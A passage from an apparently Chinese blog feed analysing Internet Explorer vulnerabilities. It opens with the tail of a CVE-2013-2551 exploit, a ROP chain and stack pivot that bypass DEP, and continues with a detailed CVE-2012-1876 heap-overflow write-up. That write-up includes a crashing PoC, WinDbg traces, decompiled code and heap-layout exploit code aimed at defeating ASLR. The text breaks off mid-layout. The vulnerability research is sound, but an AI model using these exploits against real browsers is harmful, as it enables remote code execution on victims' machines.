//NumberOfBytesToProtect -&gt; edx ntdllbase + Number(0x000CA46F), //# MOV DWORD PTR DS:[EAX],EDX # POP EBP # RETN 0x90909090, ntdllbase + Number(0x0006D4F3), //# POP EAX # OR DH,DH # RETN ntdllbase + Number(data_off-0x4), //buf3 -&gt; eax ntdllbase + Number(0x000468e0), //# POP EDX # RETN ntdllbase + Number(0x000C3C64), //# PUSHAD # RETN ntdllbase + Number(0x000CA46F), //# MOV DWORD PTR DS:[EAX],EDX # POP EBP # RETN 0x90909090, ntdllbase + Number(0x00034b9a), //# POP EDI # RETN ntdllbase + Number(0x00045360), //ZwProtectVirtualMemory -&gt; edi ntdllbase + Number(0x0001da87), //# POP EBX # RETN ntdllbase + Number(data_off+0x4), //ptr to NumberOfBytesToProtect -&gt; ebx ntdllbase + Number(0x0006D4F3), //# POP EAX # OR DH,DH # RETN 0x8b37c4da, ntdllbase + Number(0x000576DA), //# ADD EAX,74C83B66 # RETN ntdllbase + Number(0x00008cbb), //# XCHG EAX,EDX # ADD AL,0 # POP ESI # POP EBP # RETN 0x04 (0x00000040 -&gt; edx) Number(shelladdr), //return address -&gt; esi 0xffffffff, //0xffffffff -&gt; ebp ntdllbase + Number(0x000614e8), //# POP ECX # RETN 0x90909090, ntdllbase + Number(data_off+0x8), //ptr to OldAccessProtection -&gt; ecx ntdllbase + Number(0x00037B20), //# POP ESP # RETN ntdllbase + Number(data_off-0x4), //ptr to BaseAddress -&gt; esp 0x90909090, 0x90909090 ]; return arr; &#125; function d2u(dword) &#123; var uni = String.fromCharCode(dword &amp; 0xFFFF); uni += String.fromCharCode(dword&gt;&gt;16); return uni; &#125; function tab2uni(tab) &#123; var uni = "" for(var i=0;i&lt;tab.length;i++) &#123; uni += d2u(tab[i]); &#125; return uni; &#125; function exploit()&#123; var vml1 = document.getElementById("vml1") for(var i = 0; i &lt; 0x400; i++)&#123; a[i] = document.getElementById("rect" + i.toString())._anchorRect; if (i == 0x300)&#123; vml1.dashstyle = "1 2 3 4"; &#125; &#125; var length_orig = vml1.dashstyle.array.length; vml1.dashstyle.array.length = 0 - 1; vml1.dashstyle.array.item(6) = rop_addr; vml1.dashstyle.array.item(8) = rop_addr; //rop_addr -&gt; ebx vml1.dashstyle.array.item(9) = ntdllbase + 0x000cb0f8; //# MOV ESP,EBX # POP EBX # RETN for (var i=0; i&lt;0x400; i++) &#123; delete a[i]; CollectGarbage(); &#125; alert("done"); &#125; createRects(); leak(); exploit();&lt;/script&gt;&lt;/html&gt;这里有个玄学问题是，去掉alert之后利用成功率变得极低。。。有点懵逼参考资料CVE-2013-2551漏洞成因与利用分析Analysis on CVE-2013-2551CVE-2013-2551分析CVE-2013-2551样本分析及漏洞利用和防御IE 漏洞 CVE-2013-2551 分析漏洞CVE-2013-2551逆向分析]]></content>
      <categories>
        <category>browser</category>
      </categories>
      <tags>
        <tag>堆利用</tag>
        <tag>IE</tag>
        <tag>整数溢出</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IE越界访问漏洞[cve-2012-1876]分析]]></title>
    <url>%2Fpost%2Fb72ee585.html</url>
    <content type="text"><![CDATA[第一次接触ctf外的漏洞，跟着各个师傅的博客和《漏洞战争》折腾了好几天，也终于算是成功了。在这里记录一下自己整个调试过程，做个总结。调试环境windows7 32位(IE版本: 8.0.7600.16385)windbgImmunity DebuggerPOC调试poc代码：123456789101112131415&lt;html&gt;&lt;body&gt; &lt;table style="table-layout:fixed" &gt; &lt;col id="132" width="41" span="1" &gt;&amp;nbsp;&lt;/col&gt; &lt;/table&gt; &lt;script&gt; function over_trigger() &#123; var obj_col = document.getElementById("132"); obj_col.width = "42765"; obj_col.span = 1000; &#125; setTimeout("over_trigger();",1); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;基于HPA的漏洞分析方法首先用gflag.exe对IE进程开启hpa选项(gflag.exe位于windbg文件夹下)：gflag.exe -i iexplore.exe +hpa用IE打开poc.html，然后使用windbg对进程进行attach。此处注意选择位置靠下的一个进程。然后命令g，继续运行。在浏览器中允许阻止的内容。然后就可以发现windbg断下了123456789101112131415161718192021220:005&gt; g(644.3a8): Access violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.eax=00000009 ebx=00001482 ecx=00010689 edx=00000014 esi=08128000 edi=08128018eip=6ad1f167 esp=045edf08 ebp=045edf14 iopl=0 nv up ei pl nz na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010206mshtml!CTableColCalc::AdjustForCol+0x15:6ad1f167 890f mov dword ptr [edi],ecx ds:0023:08128018=????????0:005&gt; kbChildEBP RetAddr Args to Child 045edf14 6ab95b8e 00001482 045ee258 00000001 mshtml!CTableColCalc::AdjustForCol+0x15045edfc4 6aa00713 00000001 045ee258 000003e8 mshtml!CTableLayout::CalculateMinMax+0x52f045ee1e0 6a9eaf19 045ee258 045ee224 00000001 mshtml!CTableLayout::CalculateLayout+0x276045ee38c 6aadcc48 045efa00 045ee5b8 00000000 mshtml!CTableLayout::CalcSizeVirtual+0x720045ee4c4 6aacf5d0 04d00ea8 00000000 00000000 mshtml!CLayout::CalcSize+0x2b8045ee588 6aacf31d 04d00ea8 00016747 00016747 mshtml!CFlowLayout::MeasureSite+0x312045ee5d0 6aacf664 09330f00 00000061 045efa00 mshtml!CFlowLayout::GetSiteWidth+0x156045ee610 6aacfb40 09224fb0 04d00ea8 00000001 mshtml!CLSMeasurer::GetSiteWidth+0xce045ee694 6eef665d 09244ff8 045ee6b4 045ee778 mshtml!CEmbeddedILSObj::Fmt+0x150......可以看到，是由于edi中储存了一个非法地址而造成的崩溃通过汇编代码往上回溯，发现edi的值来自于[esi+0x18]，而在当前函数中没有esi的处理代码，所以往上层函数看，定位到mshtml!CTableLayout::CalculateMinMax，在此处下上断点，重新attach调试。因为下断点前要确保所在模块已经被加载，所以可以通过sxe ld:mshtml让程序在加载mshtml后断下，然后再下断点123456789101112130:013&gt; lmm mshtmlstart end module name6afb0000 6b562000 mshtml (pdb symbols) C:\Users\hgy\Desktop\WinDbg\x86\sym\mshtml.pdb\5B825981E9B445BBB998A27119FF0D6E2\mshtml.pdb0:013&gt; bp mshtml!CTableLayout::CalculateMinMax0:013&gt; bl 0 e 6b0c018a 0001 (0001) 0:**** mshtml!CTableLayout::CalculateMinMax0:013&gt; gBreakpoint 0 hiteax=ffffffff ebx=08251ea8 ecx=00412802 edx=ffffffff esi=00000000 edi=045ee604eip=6b0c018a esp=045ee3a8 ebp=045ee5c0 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableLayout::CalculateMinMax:6b0c018a 8bff mov edi,edi继续单步执行：123456789101112131415161718192021222324252627282930313233343536373839404142430:005&gt; peax=ffffffff ebx=05f8cea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0462e4e4eip=6878018c esp=0462e288 ebp=0462e4a0 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableLayout::CalculateMinMax+0x2:6878018c 55 push ebp0:005&gt; eax=ffffffff ebx=05f8cea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0462e4e4eip=6878018d esp=0462e284 ebp=0462e4a0 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableLayout::CalculateMinMax+0x3:6878018d 8bec mov ebp,esp0:005&gt; eax=ffffffff ebx=05f8cea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0462e4e4eip=6878018f esp=0462e284 ebp=0462e284 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableLayout::CalculateMinMax+0x5:6878018f 81ec90000000 sub esp,90h0:005&gt; eax=ffffffff ebx=05f8cea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0462e4e4eip=68780195 esp=0462e1f4 ebp=0462e284 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CTableLayout::CalculateMinMax+0xb:68780195 53 push ebx0:005&gt; eax=ffffffff ebx=05f8cea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0462e4e4eip=68780196 esp=0462e1f0 ebp=0462e284 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CTableLayout::CalculateMinMax+0xc:68780196 8b5d08 mov ebx,dword ptr [ebp+8] ss:0023:0462e28c=05f8cea80:005&gt; dd poi(ebp+8)05f8cea8 68679868 0562cf30 05f7efb8 6883491805f8ceb8 00000001 00000000 0108080d ffffffff05f8cec8 00000000 00000000 00000000 ffffffff05f8ced8 00016747 00009d9e 00000000 0000000005f8cee8 00000000 00412802 00000000 0000000005f8cef8 00000000 00000001 ffffffff ffffffff05f8cf08 ffffffff ffffffff 68679fd0 0000000405f8cf18 00000004 08c50ff0 68679fd0 000000040:005&gt; ln 68679868 (68679868) mshtml!CTableLayout::`vftable&apos; | (686799a8) mshtml!CTableLayoutBlock::`vftable&apos;Exact matches: mshtml!CTableLayout::`vftable&apos; = &lt;no type information&gt;我们知道，ebp+8是函数的第一个参数值，《漏洞战争》中指出该参数是CTableLayout对象指正，也就是&lt;table>标签在内存中的对象。通过配合IDA加载符号信息也可得出该结论:void __thiscall CTableLayout::CalculateMinMax(CTableLayout *this, struct CTableCalcInfo *a2, int a3, int a4)继续单步1234567891011121314151617181920212223242526272829300:005&gt; peax=ffffffff ebx=05f8cea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0462e4e4eip=68780199 esp=0462e1f0 ebp=0462e284 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CTableLayout::CalculateMinMax+0xf:68780199 56 push esi0:005&gt; eax=ffffffff ebx=05f8cea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0462e4e4eip=6878019a esp=0462e1ec ebp=0462e284 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CTableLayout::CalculateMinMax+0x10:6878019a 8b750c mov esi,dword ptr [ebp+0Ch] ss:0023:0462e290=0462e5180:005&gt; eax=ffffffff ebx=05f8cea8 ecx=00412802 edx=ffffffff esi=0462e518 edi=0462e4e4eip=6878019d esp=0462e1ec ebp=0462e284 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CTableLayout::CalculateMinMax+0x13:6878019d 8b4628 mov eax,dword ptr [esi+28h] ds:0023:0462e540=000000000:005&gt; eax=00000000 ebx=05f8cea8 ecx=00412802 edx=ffffffff esi=0462e518 edi=0462e4e4eip=687801a0 esp=0462e1ec ebp=0462e284 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CTableLayout::CalculateMinMax+0x16:687801a0 898574ffffff mov dword ptr [ebp-8Ch],eax ss:0023:0462e1f8=011710000:005&gt; eax=00000000 ebx=05f8cea8 ecx=00412802 edx=ffffffff esi=0462e518 edi=0462e4e4eip=687801a6 esp=0462e1ec ebp=0462e284 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CTableLayout::CalculateMinMax+0x1c:687801a6 8b4354 mov eax,dword ptr [ebx+54h] ds:0023:05f8cefc=00000001可以看到在ebx+0x54处储存的值为1，《漏洞战争》中指出此处即为POC中col标签的span值，记作spannum。继续往下执行，同时配合IDA查看CalculateMinMax函数有这么一段指令：1234567891011121314151617181920212223242526272829303132687802cc 8b8394000000 mov eax,dword ptr [ebx+94h] ; 取出spancmp687802d2 c1e802 shr eax,2687802d5 3bc2 cmp eax,edx ; 将spannum值与spancmp/2比较687802d7 7d39 jge mshtml!CTableLayout::CalculateMinMax+0x1fa (68780312)687802d9 3bd7 cmp edx,edi687802db 8db390000000 lea esi,[ebx+90h]687802e1 0f8c9bcbefff jl mshtml!CTableLayout::CalculateMinMax+0x1da (6867ce82)687802e7 3b5608 cmp edx,dword ptr [esi+8]687802ea 7613 jbe mshtml!CTableLayout::CalculateMinMax+0x1e7 (687802ff)687802ec 6a1c push 1Ch687802ee 8bc2 mov eax,edx687802f0 8bfe mov edi,esi687802f2 e8c08c0c00 call mshtml!CImplAry::EnsureSizeWorker (68848fb7)0:005&gt; ga 687802cc eax=00000000 ebx=05f8cea8 ecx=00000000 edx=00000001 esi=0462e518 edi=00000000eip=687802cc esp=0462e1e8 ebp=0462e284 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableLayout::CalculateMinMax+0x1b1:687802cc 8b8394000000 mov eax,dword ptr [ebx+94h] ds:0023:05f8cf3c=000000000:005&gt; peax=00000000 ebx=05f8cea8 ecx=00000000 edx=00000001 esi=0462e518 edi=00000000eip=687802d2 esp=0462e1e8 ebp=0462e284 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableLayout::CalculateMinMax+0x1b7:687802d2 c1e802 shr eax,20:005&gt; peax=00000000 ebx=05f8cea8 ecx=00000000 edx=00000001 esi=0462e518 edi=00000000eip=687802d5 esp=0462e1e8 ebp=0462e284 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableLayout::CalculateMinMax+0x1ba:687802d5 3bc2 cmp eax,edx可以看到程序获取了一个spancmp值，除以2之后与spannum比较，若spannum &lt;= spancmp/4则跳转。此时spannum == 1、spancmp/4 == 0所以不会发生跳转，程序继续往后执行直到call mshtml!CImplAry::EnsureSizeWorkerIDA反编译的函数参数为CImplAry::EnsureSizeWorker(v43, v157, (int)v37 + 0x90, 0x1Cu, (int)v125);跟进该函数（IDA）:12345678910111213141516171819202122232425262728293031int __userpurge CImplAry::EnsureSizeWorker@&lt;eax&gt;(CImplAry *this@&lt;ecx&gt;, unsigned int a2@&lt;eax&gt;, int a3@&lt;edi&gt;, unsigned int MaxCount, int a5)&#123; //MaxCount == 0x1C //a2 == spannum ... v5 = a2; v14 = 4; if ( a2 &gt;= 4 ) &#123; v14 = a2; if ( a2 &gt; 4 ) &#123; v6 = ULongAdd(*(_DWORD *)(a3 + 8), *(_DWORD *)(a3 + 8) &gt;&gt; 1, &amp;v14); if ( v6 ) return v6; if ( v5 &gt; v14 ) v14 = v5; &#125; &#125; v6 = ULongLongToUInt(&amp;dwBytes, MaxCount * (unsigned __int64)v14, v11); if ( !v6 ) &#123; if ( *(_BYTE *)(a3 + 4) &amp; 2 ) &#123; ...//不会进入此处 &#125; v6 = _HeapRealloc((LPVOID *)(a3 + 12), dwBytes, v12); ... &#125; return v6;&#125;其中ULongLongToInt的功能为:12if MaxCount*v14 &gt; 0xFFFFFFFF，dwBytes = -1;else dwBytes = MaxCount*v14;分析后可以得知，该函数将会通过_HeapRealloc()来申请一个堆空间，dwBytes为该空间的大小。同时dwBytes = (spannum &gt; 4 ? spannum : 4) * 0x1c因为我们的spannum == 1，所以将会分配4*0x1c == 0x70大小的空间观察_HeapRealloc函数，可知分配的空间地址将会被esi引用。1234567891011121314151617181920210:005&gt; peax=00000000 ebx=00000000 ecx=00000070 edx=00000000 esi=088faf44 edi=088faf38eip=68d38ff6 esp=0460e040 ebp=0460e054 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CImplAry::EnsureSizeWorker+0x9c:68d38ff6 e86edcfdff call mshtml!_HeapRealloc (68d16c69)0:005&gt; peax=00000000 ebx=00000000 ecx=77bc349f edx=00000000 esi=088faf44 edi=088faf38eip=68d38ffb esp=0460e044 ebp=0460e054 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CImplAry::EnsureSizeWorker+0xa1:68d38ffb 8bd8 mov ebx,eax0:005&gt; dd poi(esi)08c76f90 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c008c76fa0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c008c76fb0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c008c76fc0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c008c76fd0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c008c76fe0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c008c76ff0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c008c77000 ???????? ???????? ???????? ????????注意，关闭了hpa后，堆内存不会被初始化为0xc0。后面建议关闭hpa保持mshtml!CTableLayout::CalculateMinMax处的断点，让程序继续运行，再次在该函数断下。往后运行到spannum与spancmp比较处:123456789101112131415161718192021222324250:005&gt; gBreakpoint 1 hiteax=00000000 ebx=088faea8 ecx=00000000 edx=00000001 esi=0460dba8 edi=00000000eip=68c702cc esp=0460d878 ebp=0460d914 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableLayout::CalculateMinMax+0x1b1:68c702cc 8b8394000000 mov eax,dword ptr [ebx+94h] ds:0023:088faf3c=000000040:005&gt; peax=00000004 ebx=088faea8 ecx=00000000 edx=00000001 esi=0460dba8 edi=00000000eip=68c702d2 esp=0460d878 ebp=0460d914 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableLayout::CalculateMinMax+0x1b7:68c702d2 c1e802 shr eax,20:005&gt; eax=00000001 ebx=088faea8 ecx=00000000 edx=00000001 esi=0460dba8 edi=00000000eip=68c702d5 esp=0460d878 ebp=0460d914 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CTableLayout::CalculateMinMax+0x1ba:68c702d5 3bc2 cmp eax,edx0:005&gt; eax=00000001 ebx=088faea8 ecx=00000000 edx=00000001 esi=0460dba8 edi=00000000eip=68c702d7 esp=0460d878 ebp=0460d914 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableLayout::CalculateMinMax+0x1bc:68c702d7 7d39 jge mshtml!CTableLayout::CalculateMinMax+0x1fa (68c70312) [br=1]发现spancmp == 4、spannum == 1此时spancmp/4 == spannum，将会发生跳转，意味着不会再执行CImplAry::EnsureSizeWorker函数。然后在获取span值的函数mshtml!CTableCol::GetAAspan下断12345678910111213140:005&gt; bp mshtml!CTableCol::GetAAspan0:005&gt; gBreakpoint 2 hiteax=08776fd0 ebx=088faea8 ecx=00000031 edx=00000000 esi=08c76fac edi=08776fd0eip=68bfa007 esp=0460d874 ebp=0460d914 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableCol::GetAAspan:68bfa007 8bff mov edi,edi0:005&gt; gueax=000003e8 ebx=088faea8 ecx=00000002 edx=08d2dff0 esi=08c76fac edi=08776fd0eip=68e05a33 esp=0460d878 ebp=0460d914 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CTableLayout::CalculateMinMax+0x383:68e05a33 3de8030000 cmp eax,3E8h发现执行完此函数后，返回值(eax)的值已经变为了0x3e8，即POC中所设置的1000再在函数mshtml!CWidthUnitValue::GetPixelWidth处下断12345678910111213140:005&gt; bp mshtml!CWidthUnitValue::GetPixelWidth0:005&gt; gBreakpoint 1 hiteax=0047e278 ebx=00442380 ecx=004ee070 edx=004af208 esi=0249e2d8 edi=00000001eip=66ce63d8 esp=0249df9c ebp=0249e044 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CWidthUnitValue::GetPixelWidth:66ce63d8 8bff mov edi,edi0:005&gt; gueax=00001405 ebx=00442380 ecx=004ee070 edx=00000014 esi=0249e2d8 edi=00000001eip=66f35ab8 esp=0249dfa8 ebp=0249e044 iopl=0 nv up ei pl nz na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206mshtml!CTableLayout::CalculateMinMax+0x459:66f35ab8 837da400 cmp dword ptr [ebp-5Ch],0 ss:0023:0249dfe8=00000000可以看到返回值为(eax)为0x1405，该返回值为poc中col标签中的width * 125（注：《漏洞战争》和其他师傅的博客中该值都为width * 100，可能是系统配置的原因。。我也很绝望啊）接下来回到让程序崩溃的地方123456789101112131415161718192021222324252627282930v158 = CTableCell::GetAAcolSpan(v29);...v153 = 0;if ( v158 &gt; 0 )&#123; v99 = 28 * v156; v144 += v158; for ( i = 28 * v156; ; v99 = i ) &#123; v149 = (const struct CWidthUnitValue **)(v99 + *((_DWORD *)v37 + 39)); if ( v151 &amp;&amp; v158 &gt; 1 &amp;&amp; v153 == (CTableLayout *)(v158 - 1) ) &#123; v100 = (_DWORD)v155 * (v158 - 1); v99 = v147 - v100; v155 = (struct CWidthUnitValue *)(v147 - v100); &#125; CTableColCalc::AdjustForCol( (CTableColCalc *)v99, (const struct CWidthUnitValue **)v145, v149, v155, a3, v143, (int)v125); v153 = (CTableLayout *)((char *)v153 + 1); i += 28; if ( (signed int)v153 &gt;= v158 ) break; &#125;&#125;程序将会循环调用CTableColCalc::AdjustForCol，调用次数由v158控制，即调用spannum次12345678910111213141516171819202122232425262728293031320:005&gt; gBreakpoint 1 hiteax=004793d0 ebx=00421110 ecx=0000001c edx=00000014 esi=00450ffc edi=00000001eip=670bf152 esp=0235daa0 ebp=0235db4c iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableColCalc::AdjustForCol:670bf152 8bff mov edi,edi0:005&gt; dd 450fe000450fe0 00001405 00001405 00001405 00000000 00450ff0 0045f2d0 00000000 00014058 0000000000451000 004604a0 00000004 00000000 004307f800451010 00000000 00431298 00000000 0000001100451020 00000012 ffffffff 003b74ec 0000000000451030 00000017 00000017 003b74b8 0000000500451040 004432a4 003b74b8 00450c50 0000000d00451050 323f985f 8000f2d0 003a005c 0055005c0:005&gt; gBreakpoint 1 hiteax=004793d0 ebx=00421110 ecx=00000038 edx=00000014 esi=00451018 edi=00000001eip=670bf152 esp=0235daa0 ebp=0235db4c iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableColCalc::AdjustForCol:670bf152 8bff mov edi,edi0:005&gt; dd 450fe000450fe0 00001405 00001405 00001405 0000000000450ff0 0045f2d0 00000000 00014058 00001405 00451000 00001405 00001405 00000000 004307f800451010 00000000 00014058 00000000 0000001100451020 00000012 ffffffff 003b74ec 0000000000451030 00000017 00000017 003b74b8 0000000500451040 004432a4 003b74b8 00450c50 0000000d00451050 323f985f 8000f2d0 003a005c 0055005c可以看到，每次执行都会将GetPixelWidth函数获取的0x1405复制到该片内存中。由于spannum已经被修改为1000，所以会覆盖到1000 * 0x1c大小的空间。而堆块大小只有0x70，所以一定会导致堆溢出，从而crash。poc总结在首次调用CTableLayout::CalculateMinMax时，由于spannum == 1、spancmp == 0，从而调用CImplAry::EnsureSizeWorker函数，分配了4*0x1c == 0x70大小的内存块poc中通过js修改了span值之后，再次调用CTableLayout::CalculateMinMax时，spannum == 1、spancmp == 4，由于满足spannum &lt;= spancmp/4，所以发生跳转，没有重新分配内存块。在CTableColCalc::AdjustForCol函数中，因为spannum被修改为1000，所以将要写入的内存区域远远超过分配好的区域，造成溢出。漏洞利用分析内存布局这里的主要思想是构造如图所示内存布局，首先创建大小为0x100的字符串”EEEE…”，接着是同等大小的”AAAA…”和”BBBB…”，最后创建一个Button元素，即CButtonLayout对象。然后再释放掉字符串”EEEE…”所在的空间，造成内存中间隔着的0x100大小的空位。这些空位就是为了在之后分配可溢出的内存块时能够占用其中的一个，当溢出时就能够覆盖到后面的”AAAA…”和”BBBB…”字符串。因为这些字符串在IE浏览器中都是以BSTR的格式进行储存的，即:4bytes字符串长度 + 字符串数据 + \x00\x00(2bytes)所以如果能够覆盖掉4字节的字符串长度数据，将它修改为一个较大的值，就能够有效的泄露出位于后方的数据(CButtonLayout的虚表指针)。如果泄露出CButtonLayout的虚表指针，就可以通过固定的偏移值计算出mshtml.dll在程序中加载的基址。接下来就可以通过ROP绕过DEP和ASLR了。布局代码123456789101112131415161718192021222324252627282930&lt;html&gt;&lt;body&gt; &lt;div id="evil"&gt;&lt;/div&gt; &lt;script&gt; var free = "EEEE"; while (free.length &lt; 480) free += free; var string1 = "AAAA"; while (string1.length &lt; 480) string1 += string1; var string2 = "BBBB"; while (string2.length &lt; 480) string2 += string2; var fr = new Array(); var al = new Array(); var div_container = document.getElementById("evil"); div_container.style.cssText = "display:none"; for (var i = 0; i &lt; 500; i+=2) &#123; fr[i] = free.substring(0, (0x100 - 6) / 2); al[i] = string1.substring(0, (0x100 - 6) / 2); al[i+1] = string2.substring(0, (0x100 - 6) / 2); var obj = document.createElement("button"); div_container.appendChild(obj); &#125; //alert(1); for (var i = 200; i &lt; 500; i += 2) &#123; fr[i] = null; CollectGarbage(); //释放"EEEE..."字符串 &#125; &lt;/script&gt; &lt;table style="table-layout:fixed" &gt;&lt;col id="0" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="1" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="2" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="3" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="4" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="5" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="6" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="7" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="8" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="9" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="10" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="11" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="12" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="13" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="14" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="15" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="16" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="17" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="18" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="19" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="20" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="21" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="22" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="23" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="24" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="25" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="26" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="27" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="28" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="29" width="41" span="9" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style="table-layout:fixed" &gt;&lt;col 